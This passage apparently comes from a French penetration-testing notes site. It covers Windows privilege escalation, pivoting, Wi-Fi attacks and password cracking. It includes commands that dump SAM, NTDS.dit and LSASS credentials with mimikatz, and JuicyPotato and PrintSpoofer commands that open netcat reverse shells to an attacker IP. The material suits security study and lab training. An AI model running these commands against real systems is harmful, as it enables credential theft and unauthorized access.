<pre><code>Register-ScheduledTask -Action $TaskAction -TaskName \"SomeTask\"\nStart-ScheduledTask -TaskName \"SomeTask\"\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Privil%C3%A8ges/Compte%20de%20service%20avec%20peu%20de%20privil%C3%A8ges/#reactiver-les-privileges-avec-fullpowersexe","title":"R\u00e9activer les privil\u00e8ges avec FullPowers.exe","text":"<p>https://github.com/itm4n/FullPowers</p> <pre><code>c:\\TOOLS&gt;FullPowers -c \"powershell -ep Bypass\"\n[+] Successfully created scheduled task. PID=9028\n[+] CreateProcessAsUser() OK\nWindows PowerShell\nCopyright (C) Microsoft Corporation. All rights reserved.\n\nTry the new cross-platform PowerShell https://aka.ms/pscore6\n\nPS C:\\WINDOWS\\system32&gt; Get-ExecutionPolicy\nBypass\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Privil%C3%A8ges/Event%20log%20reader/","title":"Event log reader","text":"<p>Le groupe Event Log Reader ne permet pas de privesc en soi. Il permet par contre de lire les diff\u00e9rents logs, et notamment ceux en lien avec la cr\u00e9ation d'un process. \u00c9ventuellement, la commande permettant la cr\u00e9ation de ce process pourrait contenir un mot de passe en clair.</p> <p>Utilisation de wevutil.exe pour chercher la cha\u00eene de caract\u00e8re \"/user\" dans les logs:</p> <pre><code>wevtutil qe Security /rd:true /f:text | Select-String \"/user\"\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Privil%C3%A8ges/Named%20Pipe/","title":"Named Pipe","text":"<p>Lister les Named Pipe:</p> <pre><code>pipelist.exe /accepteula\nou\ngci \\\\.\\pipe\\\n</code></pre> <p>Voir les permissions d'un pipe:</p> <pre><code>accesschk.exe /accepteula \\\\.\\Pipe\\lsass -v\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Privil%C3%A8ges/SeBackup/","title":"SeBackup","text":"<p>Le privil\u00e8ge SeBackup donne droit \u00e0 l'utilisateur d'effectuer des sauvegardes. Le principe pour exploiter ce privil\u00e8ge est donc d'effectuer des sauvegardes du registre/de fichiers sensibles/etc afin d'obtenir les informations voulues.</p>"},{"location":"Red%20Team/4%20-%20Windows/Privil%C3%A8ges/SeBackup/#si-le-privilege-est-disabled","title":"Si le privil\u00e8ge est \"disabled\"","text":"<p>https://github.com/giuliano108/SeBackupPrivilege</p> <pre><code>Import-Module .\\SeBackupPrivilegeUtils.dll\nImport-Module .\\SeBackupPrivilegeCmdLets.dll\n</code></pre> <pre><code>Set-SeBackupPrivilege\nGet-SeBackupPrivilege\n</code></pre> <p>Ce qui permettra d'activer le privil\u00e8ge.</p>"},{"location":"Red%20Team/4%20-%20Windows/Privil%C3%A8ges/SeBackup/#sauvegarde-du-registre","title":"Sauvegarde du registre","text":"<p>Une sauvegarde du registre va permettre de r\u00e9cup\u00e9rer les hash pr\u00e9sents dans la SAM.</p> <pre><code>reg save HKLM\\SECURITY security.save\nreg save HKLM\\SYSTEM system.save\nreg save HKLM\\SAM sam.save\n</code></pre> <p>Une fois rapatri\u00e9 sur notre poste attaquant, il est possible d'extraire les diff\u00e9rents hash:</p> <pre><code>impacket-secretsdump -security security.save -system system.save -sam sam.save local\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Privil%C3%A8ges/SeBackup/#sauvegarde-du-fichier-ntdsdit","title":"Sauvegarde du fichier NTDS.dit","text":"<p>Plusieurs m\u00e9thodes sont possibles selon le contexte.</p>"},{"location":"Red%20Team/4%20-%20Windows/Privil%C3%A8ges/SeBackup/#diskshadow-et-robocopy","title":"Diskshadow et robocopy","text":"<p>Cr\u00e9ation d'un script \"backup.txt\" pour diskshadow:</p> <pre><code>set verbose on  \nset metadata C:\\Windows\\Temp\\meta.cab  \nset context clientaccessible  \nset context persistent  \nbegin backup  \nadd volume C: alias cdrive  \ncreate  \nexpose %cdrive% E:  \nend backup\n</code></pre> <p>puis l'ex\u00e9cuter:</p> <pre><code>diskshadow /s .\\backup.txt\n</code></pre> <p>Ceci va cr\u00e9er une r\u00e9plique de C:\\ sur le lecteur E:\\ =&gt; les fichiers de E:\\ sont ensuite copiables.</p> <pre><code>robocopy /b E:\\Windows\\ntds . ntds.dit\n</code></pre> <p>Une fois rapatri\u00e9 sur notre poste attaquant, il est possible d'extraire les diff\u00e9rents hash:</p> <pre><code>impacket-secretsdump -system system.save -ntds ntds.dit local\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Privil%C3%A8ges/SeBackup/#wbadmin","title":"Wbadmin","text":"<p>Wbadmin permet de cr\u00e9er un backup:</p> <pre><code>wbadmin start backup -quiet -backuptarget:\\\\dc01\\c$\\temp -include:c:\\windows\\ntds\n</code></pre> <p>On r\u00e9cup\u00e8re ensuite la version du backup:</p> <pre><code>wbadmin get versions\n</code></pre> <p>Puis on la restore \u00e0 un endroit accessible:</p> <pre><code>webadmin start recovery -quiet -version:07/26/2021-03:16 -itemtype:file -item:c:\\windows\\ntds\\ntds.dit -recoverytarget:c:\\temp -notrestoreacl\n</code></pre> <p>Une fois rapatri\u00e9 sur notre poste attaquant, il est possible d'extraire les diff\u00e9rents hash:</p> <pre><code>impacket-secretsdump -system system.save -ntds ntds.dit local\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Privil%C3%A8ges/SeBackup/#contrer-les-abus-de-sebackupprivilege","title":"Contrer les abus de SeBackupPrivilege","text":"<p>Pour s\u00e9curiser un syst\u00e8me contre les abus de ce privil\u00e8ge:</p> <ul> <li>Limitez l'attribution du privil\u00e8ge <code>SeBackupPrivilege</code> aux utilisateurs et services de confiance.</li> <li>Appliquez des correctifs et des mises \u00e0 jour de s\u00e9curit\u00e9.</li> <li>Utilisez des solutions de surveillance et de d\u00e9tection des menaces pour d\u00e9tecter des comportements anormaux li\u00e9s \u00e0 ce privil\u00e8ge.</li> </ul>"},{"location":"Red%20Team/4%20-%20Windows/Privil%C3%A8ges/SeDebug/","title":"SeDebug","text":"<p>Faire un dump du process LSASS.exe via procdump (dans le cas d'une connexion RDP il est aussi possible d'effectuer le dump du process depuis le gestionnaire des t\u00e2ches):</p> <pre><code>procdump.exe -accepteula -ma lsass.exe lsass.dmp\n</code></pre> <p>On lance ensuite mimiktaz afin de r\u00e9cup\u00e9rer les hashs NTLM pr\u00e9sents dans le dump de lsass.exe:</p> <pre><code>mimikatz.exe\nlog\nsekurlsa::minidump lsass.dmp\nsekurlsa::logonpasswords\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Privil%C3%A8ges/SeDebug/#sedebugprivilege-rce-en-tant-quutilisateur-system","title":"SeDebugPrivilege : RCE en tant qu'utilisateur SYSTEM","text":"<p>On r\u00e9cup\u00e8re le PID d'un process lanc\u00e9 avec l'utilisateur SYSTEM (winlogon.exe est un bon candidat):</p> <pre><code>tasklist\n</code></pre> <p>Ensuite, on t\u00e9l\u00e9charge le script \"psgetsys.ps1\" et on l'ex\u00e9cute, ce qui permettra de lancer une commande de notre choix en tant qu'utilisateur SYSTEM (un reverse shell, cmd.exe, powershell.exe...): https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1</p> <pre><code>.\\psgetsys.ps1; [MyProcess]::CreateProcessFromParent(&lt;system_pid&gt;,&lt;command_to_execute&gt;,\"\")\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Privil%C3%A8ges/SeImpersonate/","title":"SeImpersonate","text":""},{"location":"Red%20Team/4%20-%20Windows/Privil%C3%A8ges/SeImpersonate/#quest-ce-que-le-droit-seimpersonateprivilege","title":"Qu'est-ce que le droit \"SeImpersonatePrivilege\" ?","text":"<p>Ce privil\u00e8ge permet \u00e0 un processus d'adopter l'identit\u00e9 d'un autre utilisateur. Il est souvent utilis\u00e9 en conjonction avec des services Windows qui doivent s'ex\u00e9cuter avec des niveaux de privil\u00e8ges \u00e9lev\u00e9s. Un utilisateur avec ce privil\u00e8ge peut potentiellement \u00e9lever ses droits \u00e0 <code>NT AUTHORITY\\SYSTEM</code>, qui est le niveau de privil\u00e8ge le plus \u00e9lev\u00e9 sur un syst\u00e8me Windows.</p> <p>Ce privil\u00e8ge permet \u00e0 un processus d'adopter l'identit\u00e9 d'un autre utilisateur. Il est souvent utilis\u00e9 en conjonction avec des services Windows qui doivent s'ex\u00e9cuter avec des niveaux de privil\u00e8ges \u00e9lev\u00e9s. Un utilisateur avec ce privil\u00e8ge peut potentiellement \u00e9lever ses droits \u00e0 <code>NT AUTHORITY\\SYSTEM</code>, qui est le niveau de privil\u00e8ge le plus \u00e9lev\u00e9 sur un syst\u00e8me Windows.</p>"},{"location":"Red%20Team/4%20-%20Windows/Privil%C3%A8ges/SeImpersonate/#implications-en-matiere-de-securite","title":"Implications en mati\u00e8re de s\u00e9curit\u00e9","text":"<p>Si ce privil\u00e8ge est accord\u00e9 \u00e0 un utilisateur ou processus non fiable, il peut \u00eatre exploit\u00e9 pour \u00e9lever des privil\u00e8ges et effectuer des actions non autoris\u00e9es.</p>"},{"location":"Red%20Team/4%20-%20Windows/Privil%C3%A8ges/SeImpersonate/#utilisation-de-juicypotatoexe","title":"Utilisation de JuicyPotato.exe","text":"<p>JuicyPotato est un outil qui peut abuser de ce privil\u00e8ge pour ex\u00e9cuter un code arbitraire avec des privil\u00e8ges \u00e9lev\u00e9s. Notez que cet outil ne fonctionne pas \u00e0 partir de Windows Server 2019/Windows 10 \u00e0 cause des am\u00e9liorations de s\u00e9curit\u00e9.</p> <pre><code>JuicyPotato.exe -l 53375 -p c:\\windows\\system32\\cmd.exe -a \"/c c:\\tools\\nc.exe 10.10.14.3 8443 -e cmd.exe\" -t *\n</code></pre> <pre><code>nc -lnvp 8443  # Ecoute sur le port 8443 pour une connexion entrante`\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Privil%C3%A8ges/SeImpersonate/#utilisation-de-printspooferexe","title":"Utilisation de PrintSpoofer.exe","text":"<p>PrintSpoofer est une autre technique qui abuse du privil\u00e8ge <code>SeImpersonatePrivilege</code> pour \u00e9lever des privil\u00e8ges :</p> <pre><code>PrintSpoofer.exe -c \"c:\\tools\\nc.exe 10.10.14.3 8443 -e cmd\"\n</code></pre> <pre><code>nc -lnvp 8443  # Ecoute sur le port 8443 pour une connexion entrante`\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Privil%C3%A8ges/SeImpersonate/#utilisation-de-godpotatoexe","title":"Utilisation de GodPotato.exe","text":"<p>GodPotato est encore une autre patate qui abuse du privil\u00e8ge <code>SeImpersonatePrivilege</code> pour \u00e9lever des privil\u00e8ges :</p> <pre><code>GodPotato -cmd \"cmd /c whoami\"\n</code></pre> <p>[!Astuce] GodPotato est \u00e0 privil\u00e9gier, il s'agit du plus simple et est compatible avec Windows Server 2019/Windows 10 !</p>"},{"location":"Red%20Team/4%20-%20Windows/Privil%C3%A8ges/SeImpersonate/#contrer-les-abus-de-seimpersonateprivilege","title":"Contrer les abus de SeImpersonatePrivilege","text":"<p>Pour s\u00e9curiser un syst\u00e8me contre les abus de ce privil\u00e8ge:</p> <ul> <li>Limitez l'attribution du privil\u00e8ge <code>SeImpersonatePrivilege</code> aux utilisateurs et services de confiance.</li> <li>Appliquez des correctifs et des mises \u00e0 jour de s\u00e9curit\u00e9.</li> <li>Utilisez des solutions de surveillance et de d\u00e9tection des menaces pour d\u00e9tecter des comportements anormaux li\u00e9s \u00e0 ce privil\u00e8ge.</li> </ul>"},{"location":"Red%20Team/4%20-%20Windows/Privil%C3%A8ges/SeTakeOwnership/","title":"SeTakeOwnership","text":""},{"location":"Red%20Team/4%20-%20Windows/Privil%C3%A8ges/SeTakeOwnership/#quest-ce-que-le-droit-setakeownershipprivilege-setakeownership","title":"Qu'est-ce que le droit \"SeTakeOwnershipPrivilege\" (Setakeownership) ?","text":"<p>Ce privil\u00e8ge permet \u00e0 un utilisateur de s'approprier n'importe quel objet s\u00e9curisable sur le syst\u00e8me. Cela inclut des objets dans Active Directory, des fichiers et dossiers NTFS, des cl\u00e9s de registre, des services et des processus.</p>"},{"location":"Red%20Team/4%20-%20Windows/Privil%C3%A8ges/SeTakeOwnership/#implications-en-matiere-de-securite","title":"Implications en mati\u00e8re de s\u00e9curit\u00e9","text":"<p>Si un attaquant obtient ce droit, il peut potentiellement compromettre la s\u00e9curit\u00e9 du syst\u00e8me en modifiant des objets pour lesquels il n'avait pas initialement d'acc\u00e8s.</p>"},{"location":"Red%20Team/4%20-%20Windows/Privil%C3%A8ges/SeTakeOwnership/#activation-du-droit-setakeownershipprivilege","title":"Activation du droit \"SeTakeOwnershipPrivilege\"","text":"<p>Si le droit est d\u00e9sactiv\u00e9, il peut \u00eatre activ\u00e9 en utilisant une fonction PowerShell personnalis\u00e9e comme dans l'exemple ci-dessous :</p> <pre><code>Import-Module .\\Enable-Privilege.ps1  # Charge le module qui permet d'activer des privil\u00e8ges \nEnable-Privilege 'SeTakeOwnershipPrivilege'  # Active le privil\u00e8ge SeTakeOwnership`\n</code></pre> <p>Note: <code>Enable-Privilege.ps1</code> : lien vers le .ps1 \u00e0 rajouter</p>"},{"location":"Red%20Team/4%20-%20Windows/Privil%C3%A8ges/SeTakeOwnership/#sapproprier-un-fichier-ou-dossier","title":"S'approprier un fichier ou dossier","text":"<p>Pour prendre la propri\u00e9t\u00e9 d'un fichier ou d'un dossier :</p> <pre><code>takeown /f 'C:\\Department Shares\\Private\\IT\\cred.txt'  # Prend la propri\u00e9t\u00e9 du fichier`\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Privil%C3%A8ges/SeTakeOwnership/#modifier-les-acls-access-control-lists","title":"Modifier les ACLs (Access Control Lists)","text":"<p>Une fois que vous \u00eates propri\u00e9taire de l'objet, vous pouvez \u00e9galement modifier ses ACLs :</p> <pre><code>$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name  # Obtient le nom de l'utilisateur actuel \nicacls 'C:\\Department Shares\\Private\\IT\\cred.txt' /grant \"$user:F\"  # Attribue des droits d'acc\u00e8s complets au fichier`\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Privil%C3%A8ges/SeTakeOwnership/#sapproprier-et-modifier-les-acls-dune-cle-de-registre","title":"S'approprier et modifier les ACLs d'une cl\u00e9 de registre","text":"<pre><code># Prendre la propri\u00e9t\u00e9 de la cl\u00e9 de registre \ntakeown /f 'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\example'  \n# Attribuer les droits d'acc\u00e8s complets \nregini /grant=administrators=f 'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\example'`\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Privil%C3%A8ges/SeTakeOwnership/#sapproprier-un-service","title":"S'approprier un service","text":"<pre><code># Utiliser sc.exe pour reconfigurer le service \nsc.exe sdset [Nom_du_service] D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;AU)(A;;CCLCSWRPWPDTLOCRRC;;;PU)`\n</code></pre>"},{"location":"Red%20Team/5%20-%20R%C3%A9seau/D%C3%A9couverte%20d%27h%C3%B4tes/","title":"D\u00e9couverte d'h\u00f4tes","text":"<p>Ping Sweep Linux: <pre><code>for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep \"bytes from\" &amp;) ;done\n</code></pre></p> <p>Ping Sweep Windows: <pre><code>for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.1.%i &gt; nul &amp;&amp; echo 192.168.1.%i is up.\n</code></pre></p> <p>Nmap: <pre><code>nmap -sn 192.168.1.0/24\n</code></pre></p>"},{"location":"Red%20Team/5%20-%20R%C3%A9seau/Pivot%20via%20Chisel/","title":"Pivot via Chisel","text":"<p>But du jeu: <pre><code>Kali (10.10.14.227) &lt;&lt;10.10.14.0/24&gt;&gt; DMZ01 (10.129.58.6 | 172.16.8.120) &lt;&lt;192.16.8.0/24&gt;&gt; DC01 (172.16.8.3 | 172.16.9.3) &lt;&lt;172.16.9.0/24&gt;&gt; MGMT01 (172.16.9.25)`\n</code></pre></p> <p>Sur notre pc attaquant:</p> <pre><code>./chisel_linux server --socks5 -p 9001 --reverse\n</code></pre> <p>/etc/proxychains</p> <pre><code>socks5 127.0.0.1 9999\nsocks5 127.0.0.1 8888\n</code></pre> <p>DMZ01:</p> <pre><code>./chisel_linux client 10.10.14.227:9001 R:9999:socks\n./chisel_linux server  -p 9002 --reverse --socks5 \n</code></pre> <p>DC01:</p> <pre><code>chisel.exe client 172.16.8.120:9002 R:8888:socks\n</code></pre> <p>Now close any Socks4 connection (e.g. SSH Dynamic Port Forward) and comment in /etc/proxychains</p> <pre><code>#socks4 127.0.0.1 9050\n</code></pre> <p>Scan Target MGMT01 via socks5 proxy:</p> <pre><code>proxychains nmap -sT -p 22 172.16.9.25                                                    \n[proxychains] config file found: /etc/proxychains.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.14\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-11-11 17:27 EST\n[proxychains] Strict chain  ...  127.0.0.1:9999  ...  127.0.0.1:8888  ...  172.16.9.25:80 &lt;--socket error or timeout!\n[proxychains] Strict chain  ...  127.0.0.1:9999  ...  127.0.0.1:8888  ...  172.16.9.25:22  ...  OK\nRTTVAR has grown to over 2.3 seconds, decreasing to 2.0\nNmap scan report for 172.16.9.25\nHost is up (14s latency).\n\nPORT   STATE SERVICE\n22/tcp open  ssh\n\nNmap done: 1 IP address (1 host up) scanned in 16.31 seconds\n</code></pre>"},{"location":"Red%20Team/5%20-%20R%C3%A9seau/Pivot%20via%20Ligolo-ng/","title":"Pivot via Ligolo ng","text":"<p>Ligolo-ng est un outil de post-exploitation offrant un proxy r\u00e9versible. Il est modulaire, permettant la personnalisation selon les besoins sp\u00e9cifiques. Con\u00e7u pour la furtivit\u00e9, il \u00e9chappe \u00e0 la d\u00e9tection et permet un contr\u00f4le \u00e0 distance des syst\u00e8mes compromis. Facile \u00e0 utiliser et compatible avec divers syst\u00e8mes, Ligolo-ng est un outil cl\u00e9 pour les tests de p\u00e9n\u00e9tration et les audits de s\u00e9curit\u00e9.</p> <p>Mise en place: <pre><code>sudo ip tuntap add user $notreUser mode tun ligolo\n\nsudo ip link set ligolo up\n</code></pre></p> <pre><code>/home/pak/Tools/Ligolo/proxy --selfcert\n</code></pre> <p>Transfert sur le pivot: <pre><code>scp /home/pak/Tools/Ligolo/agent user@ip:/home/user/Desktop/\n</code></pre></p> <p>Sur le pivot: <pre><code>./agent --ignore-cert -connect ip:port\n</code></pre></p> <p>Ouvrir la session sur notre host, puis rajouter la route: <pre><code>sudo ip route add 192.168.0.0/24 dev ligolo\n</code></pre></p> <p>Ajouter une redirection de port (pour reverse shell etc...): <pre><code>listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4321 --tcp\n</code></pre></p>"},{"location":"Red%20Team/5%20-%20R%C3%A9seau/Pivot%20via%20SSH/","title":"Pivot via SSH","text":"<p>Si la machine cible a acc\u00e8s \u00e0 un r\u00e9seau interne, il est possible de faire du port forwarding dynamique: tout le traffic passera par notre unique port local, et sera dispatch\u00e9 sur les diff\u00e9rents ports une fois la machine cible atteinte.</p> <p>Attention: cette technique ne permet de faire passer que des paquets TCP ! Aussi, les diff\u00e9rentes machines du r\u00e9seau interne n'ont pas forc\u00e9ment de routes permettant de communiquer en direct avec notre pc attaquant, ce qui va par exemple emp\u00eacher la mise en place de reverse shell.</p> <p>Dynamic port forwarding:</p> <pre><code>ssh -D 9050 ubuntu@10.129.202.64\n</code></pre> <p>Puis rajouter, dans le fichier /etc/proxychains.conf:</p> <pre><code>socks4  127.0.0.1 9050\n</code></pre> <p>les diff\u00e9rentes commandes doivent s'\u00e9x\u00e9cuter via proxychains, exemple:</p> <pre><code>proxychains nmap -v -sn 172.16.5.1-200\n</code></pre>"},{"location":"Red%20Team/5%20-%20R%C3%A9seau/Port%20forwarding%20via%20SSH/","title":"Port forwarding via SSH","text":"<p>Port forwarding local (le port distant 3306 sera accessible via le port local 1234):</p> <pre><code>ssh -L 1234:localhost:3306 Ubuntu@10.129.202.64\n</code></pre> <p>Multiple port forwarding local:</p> <pre><code>ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@10.129.202.64\n</code></pre>"},{"location":"Red%20Team/5%20-%20R%C3%A9seau/Wifi/Wifite/","title":"Wifite","text":"<p>Globalement, wifite va tenter toutes les attaques de base possibles sur un r\u00e9seau wifi:</p> <p>En cas de WEP: - Attaque r\u00e9cup\u00e9rant la clef WEP</p> <p>En cas de WPA: - Si il y a du WPS : Attaque \"Pixi Dust\" et bruteforce - Tentative pour r\u00e9cup\u00e9rer le PMKID et le cracker - Tentative de deauth des diff\u00e9rents clients pour r\u00e9cup\u00e9rer le handshake et le cracker</p> <pre><code>wifite -i wlan0\n</code></pre>"},{"location":"Red%20Team/6%20-%20Misc/Cr%C3%A9ation%20de%20wordlists/","title":"Cr\u00e9ation de wordlists","text":""},{"location":"Red%20Team/6%20-%20Misc/Cr%C3%A9ation%20de%20wordlists/#cupp","title":"cupp","text":"<p>https://github.com/Mebus/cupp</p> <p>Permet la cr\u00e9ation de wordlist de mani\u00e8re interactive.</p> <pre><code>cupp -i\n</code></pre>"},{"location":"Red%20Team/6%20-%20Misc/Cr%C3%A9ation%20de%20wordlists/#username-anarchy","title":"Username anarchy","text":"<p>https://github.com/urbanadventurer/username-anarchy Permet de cr\u00e9er des permutations sur des noms d'utilisateurs.</p> <pre><code>./username-anarchy Bill Gates &gt; bill.txt\n</code></pre>"},{"location":"Red%20Team/6%20-%20Misc/Cr%C3%A9ation%20de%20wordlists/#cewl","title":"Cewl","text":"<p>Cewl va parser des pages web et cr\u00e9er une wordlist \u00e0 partir des termes les plus pertinents.</p> <pre><code>cewl domain.com -m 5 -w wordlist.txt\n</code></pre>"},{"location":"Red%20Team/6%20-%20Misc/Format%20hash%20john%20the%20ripper/","title":"Format hash john the ripper","text":"Hash Format Example Command Description afs <code>john --format=afs hashes_to_crack.txt</code> AFS (Andrew File System) password hashes bfegg <code>john --format=bfegg hashes_to_crack.txt</code> bfegg hashes used in Eggdrop IRC bots bf <code>john --format=bf hashes_to_crack.txt</code> Blowfish-based crypt(3) hashes bsdi <code>john --format=bsdi hashes_to_crack.txt</code> BSDi crypt(3) hashes crypt(3) <code>john --format=crypt hashes_to_crack.txt</code> Traditional Unix crypt(3) hashes des <code>john --format=des hashes_to_crack.txt</code> Traditional DES-based crypt(3) hashes dmd5 <code>john --format=dmd5 hashes_to_crack.txt</code> DMD5 (Dragonfly BSD MD5) password hashes dominosec <code>john --format=dominosec hashes_to_crack.txt</code> IBM Lotus Domino 6/7 password hashes EPiServer SID hashes <code>john --format=episerver hashes_to_crack.txt</code> EPiServer SID (Security Identifier) password hashes hdaa <code>john --format=hdaa hashes_to_crack.txt</code> hdaa password hashes used in Openwall GNU/Linux hmac-md5 <code>john --format=hmac-md5 hashes_to_crack.txt</code> hmac-md5 password hashes hmailserver <code>john --format=hmailserver hashes_to_crack.txt</code> hmailserver password hashes ipb2 <code>john --format=ipb2 hashes_to_crack.txt</code> Invision Power Board 2 password hashes krb4 <code>john --format=krb4 hashes_to_crack.txt</code> Kerberos 4 password hashes krb5 <code>john --format=krb5 hashes_to_crack.txt</code> Kerberos 5 password hashes LM <code>john --format=LM hashes_to_crack.txt</code> LM (Lan Manager) password hashes lotus5 <code>john --format=lotus5 hashes_to_crack.txt</code> Lotus Notes/Domino 5 password hashes md4-gen <code>john --format=md4-gen hashes_to_crack.txt</code> Generic MD4 password hashes md5 <code>john --format=md5 hashes_to_crack.txt</code> MD5 password hashes md5-gen <code>john --format=md5-gen hashes_to_crack.txt</code> Generic MD5 password hashes mscash <code>john --format=mscash hashes_to_crack.txt</code> MS Cache password hashes mscash2 <code>john --format=mscash2 hashes_to_crack.txt</code> MS Cache v2 password hashes mschapv2 <code>john --format=mschapv2 hashes_to_crack.txt</code> MS CHAP v2 password hashes mskrb5 <code>john --format=mskrb5 hashes_to_crack.txt</code> MS Kerberos 5 password hashes mssql05 <code>john --format=mssql05 hashes_to_crack.txt</code> MS SQL 2005 password hashes mssql <code>john --format=mssql hashes_to_crack.txt</code> MS SQL password hashes mysql-fast <code>john --format=mysql-fast hashes_to_crack.txt</code> MySQL fast password hashes mysql <code>john --format=mysql hashes_to_crack.txt</code> MySQL password hashes mysql-sha1 <code>john --format=mysql-sha1 hashes_to_crack.txt</code> MySQL SHA1 password hashes NETLM <code>john --format=netlm hashes_to_crack.txt</code> NETLM (NT LAN Manager) password hashes NETLMv2 <code>john --format=netlmv2 hashes_to_crack.txt</code> NETLMv2 (NT LAN Manager version 2) password hashes NETNTLM <code>john --format=netntlm hashes_to_crack.txt</code> NETNTLM (NT LAN Manager) password hashes NETNTLMv2 <code>john --format=netntlmv2 hashes_to_crack.txt</code> NETNTLMv2 (NT LAN Manager version 2) password hashes NEThalfLM <code>john --format=nethalflm hashes_to_crack.txt</code> NEThalfLM (NT LAN Manager) password hashes md5ns <code>john --format=md5ns hashes_to_crack.txt</code> md5ns (MD5 namespace) password hashes nsldap <code>john --format=nsldap hashes_to_crack.txt</code> nsldap (OpenLDAP SHA) password hashes ssha <code>john --format=ssha hashes_to_crack.txt</code> ssha (Salted SHA) password hashes NT <code>john --format=nt hashes_to_crack.txt</code> NT (Windows NT) password hashes openssha <code>john --format=openssha hashes_to_crack.txt</code> OPENSSH private key password hashes oracle11 <code>john --format=oracle11 hashes_to_crack.txt</code> Oracle 11 password hashes oracle <code>john --format=oracle hashes_to_crack.txt</code> Oracle password hashes pdf <code>john --format=pdf hashes_to_crack.txt</code> PDF (Portable Document Format) password hashes phpass-md5 <code>john --format=phpass-md5 hashes_to_crack.txt</code> PHPass-MD5 (Portable PHP password hashing framework) password hashes phps <code>john --format=phps hashes_to_crack.txt</code> PHPS password hashes pix-md5 <code>john --format=pix-md5 hashes_to_crack.txt</code> Cisco PIX MD5 password hashes po <code>john --format=po hashes_to_crack.txt</code> Po (Sybase SQL Anywhere) password hashes rar <code>john --format=rar hashes_to_crack.txt</code> RAR (WinRAR) password hashes raw-md4 <code>john --format=raw-md4 hashes_to_crack.txt</code> Raw MD4 password hashes raw-md5 <code>john --format=raw-md5 hashes_to_crack.txt</code> Raw MD5 password hashes raw-md5-unicode <code>john --format=raw-md5-unicode hashes_to_crack.txt</code> Raw MD5 Unicode password hashes raw-sha1 <code>john --format=raw-sha1 hashes_to_crack.txt</code> Raw SHA1 password hashes raw-sha224 <code>john --format=raw-sha224 hashes_to_crack.txt</code> Raw SHA224 password hashes raw-sha256 <code>john --format=raw-sha256 hashes_to_crack.txt</code> Raw SHA256 password hashes raw-sha384 <code>john --format=raw-sha384 hashes_to_crack.txt</code> Raw SHA384 password hashes raw-sha512 <code>john --format=raw-sha512 hashes_to_crack.txt</code> Raw SHA512 password hashes salted-sha <code>john --format=salted-sha hashes_to_crack.txt</code> Salted SHA password hashes sapb <code>john --format=sapb hashes_to_crack.txt</code> SAP CODVN B (BCODE) password hashes sapg <code>john --format=sapg hashes_to_crack.txt</code> SAP CODVN G (PASSCODE) password hashes sha1-gen <code>john --format=sha1-gen hashes_to_crack.txt</code> Generic SHA1 password hashes skey <code>john --format=skey hashes_to_crack.txt</code> S/Key (One-time password) hashes ssh <code>john --format=ssh hashes_to_crack.txt</code> SSH (Secure Shell) password hashes sybasease <code>john --format=sybasease hashes_to_crack.txt</code> Sybase ASE password hashes xsha <code>john --format=xsha hashes_to_crack.txt</code> xsha (Extended SHA) password hashes zip <code>john --format=zip hashes_to_crack.txt</code> ZIP (WinZip) password hashes Tool Description <code>pdf2john</code> Converts PDF documents for John <code>ssh2john</code> Converts SSH private keys for John <code>mscash2john</code> Converts MS Cash hashes for John <code>keychain2john</code> Converts OS X keychain files for John <code>rar2john</code> Converts RAR archives for John <code>pfx2john</code> Converts PKCS#12 files for John <code>truecrypt_volume2john</code> Converts TrueCrypt volumes for John <code>keepass2john</code> Converts KeePass databases for John <code>vncpcap2john</code> Converts VNC PCAP files for John <code>putty2john</code> Converts PuTTY private keys for John <code>zip2john</code> Converts ZIP archives for John <code>hccap2john</code> Converts WPA/WPA2 handshake captures for John <code>office2john</code> Converts MS Office documents for John <code>wpa2john</code> Converts WPA/WPA2 handshakes for John"},{"location":"Red%20Team/6%20-%20Misc/MagicByte/","title":"MagicByte","text":"HEX ISO 8859-1 Offset Extension Description <code>23 21</code> <code>#!</code> 0 Script or data to be passed to the program following the shebang (#!)1(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-1) <code>00 00 02 00 06 04 06 00 08 00 00 00 00 00</code> <code>\u2400\u2400\u2402\u2400\u2406\u2404\u2406\u2400\u2408\u2400\u2400\u2400\u2400\u2400</code> 0 wk1 Lotus 1-2-3 spreadsheet (v1) file <code>00 00 1A 00 00 10 04 00 00 00 00 00</code> <code>\u2400\u2400\u241a\u2400\u2400\u240a\u2404\u2400\u2400\u2400\u2400\u2400</code> 0 wk3 Lotus 1-2-3 spreadsheet (v3) file <code>00 00 1A 00 02 10 04 00 00 00 00 00</code> <code>\u2400\u2400\u241a\u2400\u2402\u240a\u2404\u2400\u2400\u2400\u2400\u2400</code> 0 wk4  wk5 Lotus 1-2-3 spreadsheet (v4, v5) file <code>00 00 1A 00 05 10 04</code> <code>\u2400\u2400\u241a\u2400\u2405\u240a\u2404</code> 0 123 Lotus 1-2-3 spreadsheet (v9) file <code>00 00 03 F3</code> <code>\u2400\u2400\u2403\u00f3</code> 0 Amiga Hunk executable file <code>00 00 49 49 58 50 52</code> (little-endian)  <code>00 00 4D 4D 58 50 52</code> (big-endian) 